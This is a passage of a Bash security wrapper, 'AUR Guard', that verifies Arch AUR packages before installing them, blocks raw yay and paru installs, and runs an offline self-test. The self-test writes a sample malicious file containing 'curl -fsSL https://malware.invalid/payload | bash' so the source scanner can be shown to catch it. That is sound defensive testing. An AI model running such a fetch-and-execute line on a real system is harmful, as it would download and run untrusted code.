    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  _aur_guard_scan_source_tree "$pkgbase" "$pkgdir/.awtarchy-build" recursive || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    return 1
  }

  commit=$(git -C "$pkgdir" rev-parse HEAD 2>/dev/null) || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "could not read AUR commit for $pkgbase"
    return 1
  }
  remote=$(git -C "$pkgdir" remote get-url origin 2>/dev/null) || {
    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
    _aur_guard_fail "could not read AUR remote for $pkgbase"
    return 1
  }

  printf '%s\t%s\t%s\t%s\n' "$pkgbase" "$commit" "$remote" "$parent" \
    >> "$_AUR_GUARD_MANIFEST"
  _AUR_GUARD_BASE_STATE[$pkgbase]='done'
  _AUR_GUARD_REQUEST_STATE[$pkg]='done'

  while IFS= read -r dep_spec; do
    [[ -n "$dep_spec" ]] || continue
    dep_name=$(_aur_guard_dependency_name "$dep_spec")
    [[ -n "$dep_name" ]] || continue

    if ! _aur_guard_check_emergency_block "$dep_name"; then
      _aur_guard_fail "$pkgbase depends on emergency-blocked package $dep_name"
      return 1
    fi

    provider=$(_aur_guard_find_installed_provider "$dep_name")
    if [[ -n "$provider" ]] && command pacman -T "$dep_spec" >/dev/null 2>&1; then
      if command pacman -Qm "$provider" >/dev/null 2>&1; then
        printf 'AUR Verify: %s depends on installed foreign package %s.\n' "$pkgbase" "$provider"
        _aur_guard_verify_package_recursive "$provider" "$pkgbase" || return 1
      else
        printf 'AUR Verify: %s dependency %s is satisfied by repository package %s.\n' \
          "$pkgbase" "$dep_name" "$provider"
      fi
      continue
    fi

    if command pacman -Si "$dep_name" >/dev/null 2>&1; then
      printf 'AUR Verify: %s dependency %s is available from an enabled repository.\n' \
        "$pkgbase" "$dep_name"
      continue
    fi

    exact_aur_pkg=$(_aur_guard_rpc_exact_package "$dep_name")
    if [[ -n "$exact_aur_pkg" ]]; then
      _aur_guard_verify_package_recursive "$exact_aur_pkg" "$pkgbase" || return 1
      continue
    fi

    mapfile -t providers < <(_aur_guard_rpc_providers "$dep_name")
    if (( ${#providers[@]} == 1 )); then
      printf 'AUR Verify: resolved virtual dependency %s to AUR package %s.\n' \
        "$dep_name" "${providers[0]}"
      _aur_guard_verify_package_recursive "${providers[0]}" "$pkgbase" || return 1
      continue
    fi

    if (( ${#providers[@]} > 1 )); then
      _aur_guard_fail "$pkgbase has ambiguous AUR dependency $dep_name"
      printf 'Possible providers:\n' >&2
      printf '  %s\n' "${providers[@]}" >&2
    else
      _aur_guard_fail "$pkgbase has unresolved dependency $dep_spec"
    fi
    return 1
  done < <(
    awk -F ' = ' '
      /^[[:space:]]*(depends|makedepends|checkdepends)(_[[:alnum:]_]+)? = / {
        print $2
      }
    ' "$srcinfo" | LC_ALL=C sort -u
  )

  return 0
}

_aur_guard_recheck_commits() {
  local pkgbase expected remote parent current

  while IFS=$'\t' read -r pkgbase expected remote parent; do
    [[ -n "$pkgbase" ]] || continue
    current=$(command git ls-remote "$remote" HEAD 2>/dev/null | awk 'NR == 1 {print $1}')

    if [[ -z "$current" ]]; then
      _aur_guard_fail "could not recheck current AUR commit for $pkgbase"
      return 1
    fi

    if [[ "$current" != "$expected" ]]; then
      _aur_guard_fail "$pkgbase changed after verification"
      printf 'Verified: %s\nCurrent:  %s\n' "$expected" "$current" >&2
      return 1
    fi
  done < "$_AUR_GUARD_MANIFEST"
}

_aur_guard_verify_tree() {
  local pkg="$1"

  type -P makepkg >/dev/null 2>&1 || {
    _aur_guard_fail 'makepkg is required'
    return 127
  }

  type -P git >/dev/null 2>&1 || {
    _aur_guard_fail 'git is required'
    return 127
  }

  type -P bwrap >/dev/null 2>&1 || {
    _aur_guard_fail 'bubblewrap is required. Install it with: sudo pacman -S bubblewrap'
    return 127
  }

  type -P timeout >/dev/null 2>&1 || {
    _aur_guard_fail 'timeout from coreutils is required'
    return 127
  }

  type -P gpg >/dev/null 2>&1 || {
    _aur_guard_fail 'gpg is required for isolated PGP source verification'
    return 127
  }

  type -P jq >/dev/null 2>&1 || {
    _aur_guard_fail 'jq is required for safe AUR virtual dependency resolution'
    return 127
  }

  if ! type -P curl >/dev/null 2>&1 && ! type -P wget >/dev/null 2>&1; then
    _aur_guard_fail 'curl or wget is required to check historical AUR incident lists'
    return 127
  fi

  _AUR_GUARD_HELPER=$(_aur_guard_pick_helper) || {
    _aur_guard_fail 'no yay or paru found'
    return 127
  }

  _aur_guard_refresh_blacklists || return 1

  _AUR_GUARD_WORK_DIR=$(mktemp -d) || return 1
  _AUR_GUARD_MANIFEST="$_AUR_GUARD_WORK_DIR/verified-packages.tsv"
  : > "$_AUR_GUARD_MANIFEST"

  declare -gA _AUR_GUARD_REQUEST_STATE=()
  declare -gA _AUR_GUARD_BASE_STATE=()
  _AUR_GUARD_HISTORICAL_MATCHES=()

  printf 'AUR Verify: recursively checking %s and all required AUR dependencies.\n' "$pkg"
  _aur_guard_verify_package_recursive "$pkg" '(requested)' || return 1

  printf '\nVerified AUR package bases:\n'
  awk -F '\t' '{printf "  %-36s %s\n", $1, substr($2, 1, 12)}' \
    "$_AUR_GUARD_MANIFEST"
}

_aur_guard_cleanup_work() {
  if [[ -n ${_AUR_GUARD_WORK_DIR:-} && -d $_AUR_GUARD_WORK_DIR ]]; then
    rm -rf "$_AUR_GUARD_WORK_DIR"
  fi
  unset _AUR_GUARD_WORK_DIR _AUR_GUARD_MANIFEST _AUR_GUARD_HELPER
  unset _AUR_GUARD_REQUEST_STATE _AUR_GUARD_BASE_STATE
  _AUR_GUARD_HISTORICAL_MATCHES=()
}

aurguardtest() (
  local test_root test_bin helper_log network_log historical_output
  local aurup_output wrapper_output aurup_status
  local tool

  test_root=$(mktemp -d) || return 1
  trap 'rm -rf "$test_root"' EXIT

  test_bin="$test_root/bin"
  helper_log="$test_root/helper-called.log"
  network_log="$test_root/network-called.log"
  historical_output="$test_root/historical-output.log"
  mkdir -p "$test_bin" "$test_root/cache"

  for tool in makepkg git jq bwrap gpg timeout; do
    printf '%s\n' '#!/bin/sh' 'exit 0' > "$test_bin/$tool"
  done

  cat > "$test_bin/curl" <<'AUR_GUARD_TEST_CURL'
#!/bin/sh
printf '%s\n' "$*" >> "${AUR_GUARD_TEST_NETWORK_LOG:?}"
exit 99
AUR_GUARD_TEST_CURL

  printf '%s\n' '#!/bin/sh' 'exit 1' > "$test_bin/pacman"

  cat > "$test_bin/yay" <<'AUR_GUARD_TEST_HELPER'
#!/bin/sh
printf '%s\n' "$*" >> "${AUR_GUARD_TEST_HELPER_LOG:?}"
exit 99
AUR_GUARD_TEST_HELPER

  chmod 0755 "$test_bin"/*

  export AUR_GUARD_TEST_HELPER_LOG="$helper_log"
  export AUR_GUARD_TEST_NETWORK_LOG="$network_log"
  PATH="$test_bin:$PATH"
  export PATH

  _AUR_GUARD_CACHE_DIR="$test_root/cache"
  printf '%s\n' \
    'vesktop-bin-patched' \
    'historical-only-test' \
    > "$_AUR_GUARD_CACHE_DIR/arch-malware-list.names"
  printf '%s\n' \
    'vesktop-bin-patched' \
    'historical-only-test' \
    > "$_AUR_GUARD_CACHE_DIR/github-malware-list.names"

  # Keep this test offline and deterministic. The files above simulate both
  # historical incident-list sources after a successful refresh.
  _aur_guard_refresh_blacklists() {
    return 0
  }

  printf 'AUR Guard self-test: emergency-blocked packages must be refused.\n'
  aurup_output=$(aurup vesktop-bin-patched 2>&1)
  aurup_status=$?
  printf '%s\n' "$aurup_output"

  if (( aurup_status == 0 )); then
    _aur_guard_fail 'self-test failed: aurup returned success for an emergency-blocked package'
    return 1
  fi

  if [[ -s "$helper_log" ]]; then
    _aur_guard_fail 'self-test failed: the external AUR helper was invoked'
    return 1
  fi

  if ! command grep -Fq \
      'Awtarchy refused to install: vesktop-bin-patched' <<< "$aurup_output"; then
    _aur_guard_fail 'self-test failed: expected refusal message was not produced'
    return 1
  fi

  if ! command grep -Fq \
      'emergency blocklist' <<< "$aurup_output"; then
    _aur_guard_fail 'self-test failed: refusal did not identify the emergency blocklist match'
    return 1
  fi

  printf '\nAUR Guard self-test: historical incident names must warn instead of hard-blocking.\n'
  _AUR_GUARD_HISTORICAL_MATCHES=()
  if ! _aur_guard_note_historical_match \
      'historical-only-test' > "$historical_output" 2>&1; then
    cat "$historical_output"
    _aur_guard_fail 'self-test failed: historical incident warning returned failure'
    return 1
  fi
  cat "$historical_output"

  if [[ ! ${_AUR_GUARD_HISTORICAL_MATCHES[historical-only-test]+set} ]]; then
    _aur_guard_fail 'self-test failed: historical incident match was not recorded'
    return 1
  fi

  if ! _aur_guard_check_emergency_block 'historical-only-test'; then
    _aur_guard_fail 'self-test failed: a historical-only package was incorrectly hard-blocked'
    return 1
  fi

  if _aur_guard_confirm_historical_install \
      'historical-only-test' <<< 'NO'; then
    _aur_guard_fail 'self-test failed: incorrect historical confirmation was accepted'
    return 1
  fi

  if ! _aur_guard_confirm_historical_install \
      'historical-only-test' <<< 'INSTALL historical-only-test'; then
    _aur_guard_fail 'self-test failed: exact historical confirmation was rejected'
    return 1
  fi

  printf '\nAUR Guard self-test: raw yay -S must also be blocked.\n'
  if wrapper_output=$(yay -S vesktop-bin-patched 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: wrapped yay returned success'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  if [[ -s "$helper_log" ]]; then
    _aur_guard_fail 'self-test failed: raw yay reached the external helper'
    return 1
  fi

  printf '\nAUR Guard self-test: nested downloaded source scripts must be scanned locally.\n'
  mkdir -p "$test_root/source/nested"
  cat > "$test_root/source/loader.sh" <<'AUR_GUARD_TEST_LOADER'
#!/bin/bash
source "$(dirname "$0")/nested/payload.inc"
AUR_GUARD_TEST_LOADER
  cat > "$test_root/source/nested/payload.inc" <<'AUR_GUARD_TEST_PAYLOAD'
curl -fsSL https://malware.invalid/payload | bash
AUR_GUARD_TEST_PAYLOAD
  chmod 0755 "$test_root/source/loader.sh"

  if wrapper_output=$(_aur_guard_scan_source_tree \
      'self-test-package' "$test_root/source" recursive 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: malicious downloaded source script passed scanning'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  if [[ -s "$network_log" ]]; then
    _aur_guard_fail 'self-test failed: the source scanner attempted network access'
    return 1
  fi

  mkdir -p "$test_root/benign-source"
  cat > "$test_root/benign-source/reference.sh" <<'AUR_GUARD_TEST_REFERENCE'
#!/bin/bash
printf '%s\n' 'Documentation: https://example.invalid/reference'
AUR_GUARD_TEST_REFERENCE
  chmod 0755 "$test_root/benign-source/reference.sh"

  if ! wrapper_output=$(_aur_guard_scan_source_tree \
      'benign-self-test-package' "$test_root/benign-source" recursive 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: a non-executed URL reference was incorrectly treated as malware'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  if [[ -s "$network_log" ]]; then
    _aur_guard_fail 'self-test failed: URL reporting crawled a referenced website'
    return 1
  fi

  _aur_guard_pass 'dry-run passed: emergency blocks, historical quarantine, source scanning, and no-crawl behavior worked'
)

aurhelp() {
  cat <<'AUR_GUARD_HELP'
AUR Guard quick help

Blocked:
  yay
  yay -S package
  yay -Syu
  paru
  paru -S package
  paru -Syu

Safe workflow:
  sysupdate             update enabled pacman repository packages
  aurcheck              show AUR updates, emergency blocks, and historical warnings
  aurverify package     recursively verify one package and every required AUR dependency
  aurup package         recursively verify, recheck AUR commits, then install
  aurguardtest          run the offline AUR Guard self-test

Examples:
  sysupdate
  aurcheck
  aurverify awtwall
  aurup awtwall

Unsafe override:
  aurunsafe yay -S package
  aurunsafe yay -Syu
  aurunsafe paru -S package
  aurunsafe paru -Syu

Important:
  AUR packages are not official Arch packages.
  The downloaded incident lists are historical affected-package records.
  Historical matches trigger enhanced verification and explicit install confirmation.
  Only the built-in emergency list and current malicious patterns hard-block installation.
  PKGBUILD metadata, source downloads, and source extraction run inside bubblewrap.
  Downloaded script/build files are scanned before installation is allowed.
  Source verification proves sources match the PKGBUILD declarations.
  Pattern scanning still cannot prove that upstream source code is harmless.
AUR_GUARD_HELP
}

sysupdate() {
  sudo pacman -Syu
}

aurcheck() {
  local helper output pkg
  local hard_blocked=false

  helper=$(_aur_guard_pick_helper) || {
    _aur_guard_fail 'no yay or paru found'
    return 127
  }

  _aur_guard_refresh_blacklists || return 1
  _AUR_GUARD_HISTORICAL_MATCHES=()

  output=$(command "$helper" -Qua) || return $?
  if [[ -z "$output" ]]; then
    printf 'No AUR updates available.\n'
    return 0
  fi

  printf '%s\n' "$output"
  printf '\nAUR Guard incident check:\n'

  while IFS= read -r pkg; do
    [[ -n "$pkg" ]] || continue

    if ! _aur_guard_check_emergency_block "$pkg"; then
      hard_blocked=true
      continue
    fi

    _aur_guard_note_historical_match "$pkg"
  done < <(awk '{print $1}' <<< "$output" | LC_ALL=C sort -u)

  if $hard_blocked; then
    _aur_guard_fail 'one or more available updates match the Awtarchy emergency blocklist'
    _AUR_GUARD_HISTORICAL_MATCHES=()
    return 1
  fi

  if _aur_guard_has_historical_matches; then
    _aur_guard_print_historical_summary
    _aur_guard_pass 'no emergency-blocked updates found; historical matches require full aurup verification and confirmation'
  else
    _aur_guard_pass 'no available AUR update names matched the emergency or historical incident lists'
  fi

  _AUR_GUARD_HISTORICAL_MATCHES=()
}

aurverify() {
  local pkg status

  if [[ $# -ne 1 ]]; then
    printf 'Usage: aurverify package_name\n' >&2
    printf 'Example: aurverify awtwall\n' >&2
    return 1
  fi

  pkg="$1"

  if command pacman -Si "$pkg" >/dev/null 2>&1; then
    local repo_name
    repo_name=$(command pacman -Si "$pkg" 2>/dev/null | awk -F': ' '/^Repository/ {print $2; exit}')

    if ! _aur_guard_check_emergency_block "$pkg"; then
      _aur_guard_fail "$pkg is available from [$repo_name] but is explicitly emergency-blocked by Awtarchy"
      return 1
    fi

    printf 'AUR Verify: %s is available from enabled pacman repo [%s].\n' "$pkg" "$repo_name"
    printf 'Historical AUR incident lists do not apply to this repository package.\n'
    _aur_guard_pass "$pkg is handled by pacman. Nothing was installed."
    return 0
  fi

  _aur_guard_verify_tree "$pkg"
  status=$?

  if (( status == 0 )); then
    if _aur_guard_has_historical_matches; then
      _aur_guard_print_historical_summary
      _aur_guard_pass "$pkg and all required AUR dependencies passed enhanced verification. Historical incident warnings remain. Nothing was installed."
    else
      _aur_guard_pass "$pkg and all required AUR dependencies passed verification. Nothing was installed."
    fi
  fi

  _aur_guard_cleanup_work
  return "$status"
}

aurup() {
  local pkg status helper

  if [[ $# -ne 1 ]]; then
    printf 'Usage: aurup package_name\n' >&2
    printf 'Example: aurup awtwall\n' >&2
    return 1
  fi

  pkg="$1"

  if command pacman -Si "$pkg" >/dev/null 2>&1; then
    local repo_name
    repo_name=$(command pacman -Si "$pkg" 2>/dev/null | awk -F': ' '/^Repository/ {print $2; exit}')

    if ! _aur_guard_check_emergency_block "$pkg"; then
      _aur_guard_refuse_install "$pkg" "the package is explicitly emergency-blocked by Awtarchy, even though [$repo_name] currently provides it"
      return 1
    fi

    printf 'AUR Guard: %s is available from enabled pacman repo [%s].\n' "$pkg" "$repo_name"
    printf 'Historical AUR incident lists do not apply to this repository package.\n'
    printf 'Installing with pacman:\n  sudo pacman -S %s\n\n' "$pkg"
    sudo pacman -S "$pkg"
    return $?
  fi

  _aur_guard_verify_tree "$pkg"
  status=$?

  if (( status != 0 )); then
    _aur_guard_refuse_install "$pkg" 'recursive AUR verification failed'
    _aur_guard_cleanup_work
    return "$status"
  fi

  if ! _aur_guard_recheck_commits; then
    _aur_guard_refuse_install "$pkg" 'an AUR package changed after it was verified'
    _aur_guard_cleanup_work
    return 1
  fi

  if ! _aur_guard_confirm_historical_install "$pkg"; then
    _aur_guard_refuse_install "$pkg" 'historical incident confirmation was not accepted'
    _aur_guard_cleanup_work
    return 1
  fi

  helper="$_AUR_GUARD_HELPER"
  printf '\nAUR Guard: verification passed. Installing %s with %s.\n' "$pkg" "$helper"
  command "$helper" -S "$pkg"
  status=$?
  _aur_guard_cleanup_work
  return "$status"
}

aurunsafe() {
  local helper="${1:-}"
  local answer

  shift || true

  case "$helper" in
    yay|paru)
      ;;
    *)
      printf 'Usage: aurunsafe yay|paru [args...]\n' >&2
      printf 'Example: aurunsafe yay -Syu\n' >&2
      return 1
      ;;
  esac

  if ! type -P "$helper" >/dev/null 2>&1; then
    printf '%s is not installed or not in PATH.\n' "$helper" >&2
    return 127
  fi

  printf '\033[1;31mUnsafe AUR override requested.\033[0m\n'
  printf 'This bypasses Awtarchy AUR Guard and runs raw %s.\n' "$helper"
  printf 'Type exactly YES to continue: '
  read -r answer

  if [[ "$answer" != 'YES' ]]; then
    printf 'Cancelled.\n'
    return 1
  fi

  command "$helper" "$@"
}

yay() {
  if _aur_guard_has_unsafe_flag "$@"; then
    printf 'AUR Guard blocked unsafe yay flags. Use aurhelp.\n' >&2
    return 1
  fi

  if _aur_guard_is_mass_update "$@" \
      || _aur_guard_is_sync_install "$@" \
      || _aur_guard_has_default_install_search "$@"; then
    _aur_guard_block_message yay
    return 1
  fi

  command yay "$@"
}

paru() {
  if _aur_guard_has_unsafe_flag "$@"; then
    printf 'AUR Guard blocked unsafe paru flags. Use aurhelp.\n' >&2
    return 1
  fi

  if _aur_guard_is_mass_update "$@" \
      || _aur_guard_is_sync_install "$@" \
      || _aur_guard_has_default_install_search "$@"; then
    _aur_guard_block_message paru
    return 1
  fi

  command paru "$@"
}
